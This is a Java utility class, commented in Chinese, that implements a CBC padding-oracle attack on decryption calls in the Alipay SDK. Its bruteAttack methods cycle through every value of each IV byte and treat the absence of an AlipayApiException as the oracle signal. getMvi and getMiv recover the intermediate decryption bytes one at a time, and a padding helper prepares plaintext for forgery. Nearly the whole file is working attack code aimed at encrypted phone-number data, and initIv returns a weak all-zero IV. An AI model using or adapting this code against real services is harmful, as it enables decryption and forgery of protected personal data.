import com.alipay.api.AlipayApiException;
import com.alipay.api.internal.util.codec.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;


public class Util {

    public static byte[] getMvi(byte[] cipherTextByte)  throws Exception{
        byte[] realMvi = new byte[16];
        byte[] attackVi = new byte[16];
        byte miv;
        byte padding = 0x01;
        for (int i = 0; i <= 15; i++) {
            miv = bruteAttack(cipherTextByte, i, attackVi);
            realMvi[15-i] = (byte)(miv^padding);
            padding += 0x01;
            Util.setAttackVi(i, padding, realMvi, attackVi);
            Util.printByteArray("realMvi", realMvi);
        }
        return realMvi;
    }
    public static byte[] getMiv(byte[] cipherTextByte, DecryptUtil decryptUtil)  throws Exception{
        byte[] realMvi = new byte[16];
        byte[] attackVi = new byte[16];
        byte miv;
        byte padding = 0x01;
        for (int i = 0; i <= 15; i++) {
            Util.printByteArray("realMvi", realMvi);
            Util.printByteArray("attackVi", attackVi);
            miv = bruteAttack(cipherTextByte, i, attackVi, decryptUtil);
            realMvi[15-i] = (byte)(miv^padding);
            padding += 0x01;
            Util.setAttackVi(i, padding, realMvi, attackVi);
            Util.printByteArray("realMvi", realMvi);
        }
        return realMvi;
    }


    private static byte bruteAttack( byte[] cipherText, int index, byte[] attackIv) throws Exception{
        // 000000000000000001
        for (int i = 0; i < 256; i++) {
            byte b = (byte)i;
            attackIv[15-index] = b;
            Util.printByteArray("iv", attackIv);
            try {
                byte[] ivAndEncryptedText  = Util.concat(attackIv, cipherText);
                //String s = Util.Byte2Array(result);
                String s = new String(Base64.encodeBase64(ivAndEncryptedText));
                System.out.println(s);
                AliSdk.decryptPhone(s);
                //JdkCrypt.decryptWithIv(new String(cipherText), AliSdk.secret, new String(attackIv));
                // 如果没报错，就是正确的 mvi
                return b;
            } catch (com.alipay.api.AlipayApiException e) {
                continue;
            } catch (Exception e) {
                e.printStackTrace();
                break;
            }
        }
        throw new Exception("error");
    }



    private static byte bruteAttack( byte[] cipherText, int index, byte[] attackIv, DecryptUtil decryptUtil) throws Exception{
        // 000000000000000001
        for (int i = 0; i < 256; i++) {
            byte b = (byte)i;
            attackIv[15-index] = b;
            Util.printByteArray("attackIv", attackIv);
            try {
                // 对于最后一位的爆破的情况，依据padding算法，最后一组全部是填充，如果不拼接任意一组密文到需要爆破的密文之前，
                // 将会会到解密的结果为空。这样加密算法也会认为出错。
                byte[] ivAndEncryptedText  = Util.concat(attackIv, cipherText);

                Util.printByteArray("cipherText", ivAndEncryptedText);

                decryptUtil.decryptWithIv(
                    // byte 不能直接string， 因为有些字符不能直接转化， 需要先base64 下。
                    new String(Base64.encodeBase64(ivAndEncryptedText)),
                    new String(Base64.encodeBase64(attackIv)));
                // 如果没报错，就是正确的 mvi
                return b;
            } catch (AlipayApiException e) {
                continue;
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
        throw new Exception("error");
    }

    public static int charToInt(char c) throws IllegalArgumentException {
        if ('0' <= c && c <= '9') return c - '0';
        if ('A' <= c && c <= 'F') return c - 'A' + 10;
        if ('a' <= c && c <= 'f') return c - 'a' + 10;
        throw new IllegalArgumentException("invalid input for charToInt()");
    }

    public static byte[] setAttackVi(int index, byte padding,  byte[] realMvi, byte[] attackVi){
        for(int i= 15-index; i<16; i++){
            attackVi[i] = (byte)(realMvi[i]^padding);
        }
        return attackVi;
    }


    public static byte[] hexToBytes(String hex) {
        if (hex == null || hex.isEmpty() || (hex.length() & 1) == 1)
            throw new IllegalArgumentException("invalid input for hexToBytes()");
        char[] c = hex.toCharArray();

        int len = hex.length() >> 1;
        byte[] d = new byte[len];
        for (int i = 0; i < len; i++) {
            int pos = i << 1;
            d[i] = (byte) (charToInt(c[pos]) << 4 | charToInt(c[pos + 1]));
        }
        return d;
    }



    public static byte[] concat(byte[] first, byte[] second) {
        byte[] result = Arrays.copyOf(first, first.length + second.length);
        System.arraycopy(second, 0, result, first.length, second.length);
        return result;
    }


    public static void printByteArray(String name, byte[] ba) {
        System.out.print(name + " (" + ba.length + " bytes): ");
        for (byte b : ba) System.out.printf("%02x", b);
        //for (byte b : ba) System.out.println(b);
        System.out.println();
    }


    public static byte[] initIv() {
        byte[] iv;
        int i;
        try {
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            int blockSize = cipher.getBlockSize();
            iv = new byte[blockSize];

            for(i = 0; i < blockSize; ++i) {
                iv[i] = 0;
            }

            return iv;
        } catch (Exception var5) {
            int blockSize = 16;
            iv = new byte[blockSize];

            for(i = 0; i < blockSize; ++i) {
                iv[i] = 0;
            }

            return iv;
        }
    }

    /**
     * 给明文填充padding字符
     * @param targetPlainText
     * @return
     */
    public static byte[] paddingPlainText(String targetPlainText){
        byte[] targetPlainByte = targetPlainText.getBytes();
        int paddingLength = 16 - (targetPlainByte.length % 16);
        byte[]  paddingByte = new byte[paddingLength];

        for(int i = 0; i < paddingLength; ++i) {
            paddingByte[i] = (byte)paddingLength;
        }
        return Util.concat(targetPlainByte, paddingByte);
    }
}
